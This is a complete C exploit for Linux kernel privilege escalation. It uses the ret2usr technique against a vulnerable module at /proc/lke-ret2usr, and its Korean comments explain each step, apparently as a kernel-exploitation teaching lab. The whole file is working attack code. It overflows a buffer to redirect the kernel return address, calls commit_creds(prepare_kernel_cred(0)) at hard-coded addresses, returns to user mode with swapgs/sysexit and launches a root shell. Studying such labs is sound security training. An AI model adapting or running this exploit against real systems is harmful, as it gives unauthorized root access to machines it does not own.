// gcc -o exploit exploit.c -masm=intel
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
struct task_struct;
struct cred;
static struct cred *(*prepare_kernel_cred)(struct task_struct *daemon) =
	(void *) 0xffffffff81081716;
static int (*commit_creds)(struct cred *new) =
	(void *) 0xffffffff8108157b;
/*
 * ret2usr 이후 스택으로 사용될 버퍼입니다.
 * __attribute__((aligned(16)))은 system() 함수가 정상 동작하기 위해 필요합니다.
 */
uint64_t dummy_stack[512] __attribute__((aligned(16)));
/* shell_thunk에서 SS 복구 후 호출되는 함수입니다. */
void shell(void)
{
	system("/bin/sh");
	_exit(0);
}
/* ret2usr에서 사용자 모드로 반환한 후 shell_thunk 함수가 실행됩니다.
 * __attribute__((naked))는 push rbp; mov rbp, rsp와 같은 프롤로그를 없애기 위해 필요합니다.
 */
__attribute__((naked)) void shell_thunk(void)
{
	asm volatile(
		/* SS 레지스터를 복구합니다. */
		"mov ax, 0x2b\n\t"
		"mov ss, ax\n\t"
		/* shell 함수로 이동합니다. */
		"jmp shell"
	);
}
/* 커널 모드에서 실행되는 함수입니다. */
void ret2usr(void)
{
	/* CPU 레지스터와 1:1 대응하는 변수를 선언합니다. */
	volatile register uint64_t RCX asm("rcx"), RDX asm("rdx");
	commit_creds(prepare_kernel_cred(0));  /* 권한을 상승시킵니다. */
	RCX = (uint64_t)(dummy_stack + 512);   /* 스택 포인터를 사용자 영역의 버퍼에 위치시킵니다. */
	RDX = (uint64_t)shell_thunk;           /* SYSEXIT 이후 리턴할 함수 주소를 지정합니다. */
	asm volatile(
		"cli\n\t"        /* 인터럽트로 인한 레이스 컨디션을 방지합니다. */
		"swapgs\n\t"     /* KernelGSBase에 저장된 주소를 GSBase와 교환합니다. */
		"rex.W sysexit"  /* SYSEXIT 명령을 64비트 모드로 실행합니다. */
		/* 컴파일러가 레지스터 변수를 제거하지 않도록 합니다. */
		:: "r" (RCX), "r" (RDX)
	);
}
int main(void)
{
	int fd;
	char payload[0x118];
	/* 취약한 모듈과 통신할 수 있는 가상 파일을 엽니다. */
	fd = open("/proc/lke-ret2usr", O_WRONLY);
	if (fd < 0) { perror("open"); return EXIT_FAILURE; }
	memset(payload, 'A', 0x110);
	/* 리턴주소를 ret2usr 함수로 덮습니다. */
	*(uint64_t *)(payload + 0x110) = (uint64_t)ret2usr;
	/* 익스플로잇을 실제로 수행합니다. */
	write(fd, payload, sizeof(payload));
	/* 익스플로잇이 성공했으면 write() 함수는 리턴하지 않습니다. */
	abort();
}